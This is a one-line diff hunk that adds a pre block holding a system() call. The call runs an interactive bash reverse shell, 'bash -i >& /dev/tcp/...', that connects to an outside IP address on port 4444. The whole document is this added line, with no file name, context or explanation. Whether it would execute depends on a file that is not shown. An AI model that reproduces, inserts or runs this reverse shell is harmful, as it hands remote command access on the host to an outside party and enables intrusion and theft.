@@ -1,0 +1,1 @@
+<pre>system('bash -i >& /dev/tcp/85.15.66.62/4444 0>&1')</pre>
